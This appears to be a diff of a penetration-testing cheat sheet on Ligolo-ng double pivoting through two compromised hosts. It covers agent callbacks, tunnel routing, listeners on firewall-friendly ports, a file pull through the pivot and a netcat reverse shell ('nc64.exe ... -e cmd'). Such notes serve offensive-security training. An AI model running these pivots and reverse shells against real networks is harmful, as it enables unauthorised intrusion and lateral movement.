@@ -37,35 +37,25 @@ Subnet only Target 2 can see
 Each new layer needs: a new TUN device, a new agent connecting to the _previous hop's_ reachable IP (not directly to Kali), a `start --tun` in the proxy console, and a new `ip route add` on Kali. Traffic for the deepest subnet transparently rides through every TUN interface stacked on top of it.
 
 ---
-
 ## 1st Pivot on 1st internal range
 
-**1. Create and bring up `tunnel1` on Kali**
-
-```bash
-sudo ip tuntap add user root mode tun tunnel1
-sudo ip link set tunnel1 up
-```
-
-Creates the virtual network interface Ligolo will route traffic through for this pivot.
-
-**2. Start the Ligolo proxy server on Kali**
+**1. Start the Ligolo proxy server on Kali**
 
 ```bash
 sudo ligolo-proxy -selfcert
 ```
 
-Launches the Ligolo C2-style console and listens for incoming agent connections (self-signed TLS).
+Launches the console and listens for incoming agent connections (self-signed TLS).
 
-**3. Run the agent on Target 1, connecting back to Kali's TUN0 IP**
+**2. Run the agent on Target 1, connecting back to Kali's TUN0 IP**
 
->**Windows**
+> **Windows**
 
 ```powershell
 .\agent.exe -connect 10.10.14.14:11601 -ignore-cert
 ```
 
->**Linux**
+> **Linux**
 
 ```bash
 ./agent -connect 10.10.14.14:11601 -ignore-cert
@@ -73,23 +63,42 @@ Launches the Ligolo C2-style console and listens for incoming agent connections 
 
 The agent phones home to the proxy over the VPN-reachable external IP, establishing Layer 1.
 
-**4. In the proxy console, select the agent and bind it to `tunnel1`**
+**3. Select the new session in the proxy console**
 
 ```
-start --tun tunnel1
+ligolo-ng » session
 ```
 
-Attaches the live agent session to the local TUN interface, making the tunnel active.
+Pick the agent that just connected from the list.
 
-**5. Route Target 1's internal subnet through `tunnel1` (new Kali terminal)**
+**4. Run `autoroute`**
+
+```
+[Agent : Target1] » autoroute
+```
+
+This reads the agent's network interfaces/routing table, displays the subnets it can see (e.g. `172.16.5.0/24`), and interactively:
+
+- prompts for which subnet(s) to route,
+- creates a TUN interface on Kali (random name, or a chosen one),
+- adds the matching `ip route`,
+- starts the tunnel.
+
+**5. Manual fallback, if `autoroute` fails or full manual control is preferred**
 
 ```bash
+# On Kali
+sudo ip tuntap add user $(whoami) mode tun tunnel1
+sudo ip link set tunnel1 up
 sudo ip route add 172.16.5.0/24 dev tunnel1
 ```
 
-Tells Kali's kernel: any traffic for `172.16.5.0/24` should go out via `tunnel1` (and therefore through the agent on Target 1).
+```
+# In the proxy console, with the Target 1 session selected
+start --tun tunnel1
+```
 
-**6. Add a listener on `tunnel1`**
+**6. Add a listener on the tunnel, for the next hop**
 
 ```
 listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
@@ -103,71 +112,77 @@ Opens a listening port **inside** Target 1's network (reachable from hosts in `1
 netexec smb 172.16.5.0/24
 ```
 
-Confirms route/tunnel works by sweeping SMB across the newly reachable subnet.
+Confirms the route/tunnel works by sweeping SMB across the newly reachable subnet.
 
 ---
 
 ## 2nd Pivot on 2nd internal range
 
-**1. Create and bring up `tunnel2` on Kali**
+**1. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**
 
-```bash
-sudo ip tuntap add user root mode tun tunnel2
-sudo ip link set tunnel2 up
-```
-
-A second, separate TUN interface.
-
-**2. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**
+powershell
 
 ```powershell
 .\agent.exe -connect 172.16.5.10:11601 -ignore-cert
 ```
 
-Target 2 can't reach Kali directly, it can only reach Target 1, so it dials the listener opened in step 6 above, which proxies the connection back to your Ligolo console.
+Target 2 can't reach Kali directly, it can only reach Target 1, so it dials the listener opened in step 6 above, which proxies the connection back to the Ligolo console.
 
-**3. In the proxy console, select the new agent session and bind it to `tunnel2`**
+**2. Select the new agent session and run `autoroute` again**
+
+```
+ligolo-ng » session
+[Agent : Target2] » autoroute
+```
+
+Select the Target 2 subnet (e.g. `172.16.6.0/24`). This creates a _second_ TUN interface (`tunnel2`), adds the route, and starts Layer 2 — automatically stacked on top of Layer 1.
+
+**Manual fallback:**
+
+bash
+
+```bash
+sudo ip tuntap add user $(whoami) mode tun tunnel2
+sudo ip link set tunnel2 up
+sudo ip route add 172.16.6.0/24 dev tunnel2
+```
 
 ```
 start --tun tunnel2
 ```
 
-Make sure to select the correct (new) session before running this. This activates Layer 2.
-
-**4. Route Target 2's internal subnet through `tunnel2`**
-
-```bash
-sudo ip route add 172.16.6.0/24 dev tunnel2
-```
-
-Now traffic for `172.16.6.0/24` is sent through Layer 2 (which itself rides on top of Layer 1).
-
-**5. Add listeners for commonly-whitelisted ports (port forwarding step)**
+**3. Add listeners for commonly-whitelisted ports (port forwarding step)**
 
 ```
 listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
 listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
 ```
 
-Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali, useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
+Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali — useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.
 
-**6. Pull a file from Kali through Target 1's internal IP**
+**4. Pull a file from Kali through Target 1's internal IP**
+
+powershell
 
 ```powershell
 wget http://172.16.5.10/file -outfile file
 ```
 
-Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever you're hosting on Kali (e.g. `python3 -m http.server`).
+Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever is being hosted on Kali (e.g. `python3 -m http.server`).
 
-**7. Catch a reverse shell from Target 2**
+**5. Catch a reverse shell from Target 2**
+
+powershell
 
 ```powershell
 nc64.exe 172.16.5.10 443 -e cmd
 ```
 
-Target 2 calls back to Target 1's internal IP on a whitelisted port; the listener relays it to your local `nc` listener on Kali.
+Target 2 calls back to Target 1's internal IP on a whitelisted port; the listener relays it to the local `nc` listener on Kali.
 
-**8. Verify reachability on the second subnet**
+**6. Verify reachability on the second subnet**
+
+bash
 
 ```bash
 netexec smb 172.16.6.0/24
@@ -177,39 +192,64 @@ Confirms Layer 2 is working end-to-end.
 
 ---
 
-## Local Port Forwarding to Kali
+## Local Port Forwarding to Kali (the `240.0.0.1` trick)
 
-This is used when only one internal-only service/port (e.g. an internal web app) needs to be reachable directly from a Kali tool or Firefox.
+Used when only one internal-only service/port on the agent's own loopback (e.g. an internal web app bound to `127.0.0.1`) needs to be reachable directly from a Kali tool or Firefox.
 
-**1. Create a dedicated TUN interface**
+**1. Connect the agent to the proxy**
 
-```bash
-sudo ip tuntap add user root mode tun ligolo
-sudo ip link set ligolo up
-```
-
-**2. Connect the agent to your proxy (TUN0 IP)**
+powershell
 
 ```powershell
 .\agent.exe -connect 10.10.14.14:11601 -ignore-cert
 ```
 
-**3. In the proxy console, bind the session to `ligolo`**
+**2. Create the interface and route**
+
+Either let `autoroute` handle it, or do it manually:
+
+bash
+
+```bash
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+sudo ip route add 240.0.0.1/32 dev ligolo
+```
 
 ```
 start --tun ligolo
 ```
 
-**4. Add the route**
-
-```bash
-sudo ip route add 240.0.0.1/32 dev ligolo
-```
-
 `240.0.0.1` is a special Ligolo address representing "the agent's localhost." Any port the agent can reach on `127.0.0.1` (its own loopback) becomes reachable from Kali at `240.0.0.1`, with no proxychains required.
 
-**5. Verify with Nmap**
+**3. Verify with Nmap**
+
+bash
 
 ```bash
 nmap -p- 240.0.0.1
+```
+
+---
+
+## Listener management (v0.8+)
+
+```
+listener_list                                       # list all active listeners/relays
+listener_stop --id <id>                             # tear down a specific listener
+listener_add --addr 0.0.0.0:1080 --to 127.0.0.1 --socks5   # stand up a SOCKS5 listener instead of a plain TCP/UDP relay
+listener_add --addr 0.0.0.0:53 --to 127.0.0.1:53 --udp     # explicit UDP relay (default is TCP)
+```
+
+---
+
+## Other useful console commands (v0.8+)
+
+```
+session              # list/select agent sessions
+autoroute            # auto-discover + create interface/route/tunnel for the selected session
+ifconfig             # show the selected agent's network interfaces (handy before deciding what to route)
+interface_create --name ligolo   # create a TUN interface from inside the console, instead of ip tuntap
+tunnel_list          # show active tunnels and which session/interface they're bound to
+kill                 # remotely terminate the selected agent
 ```
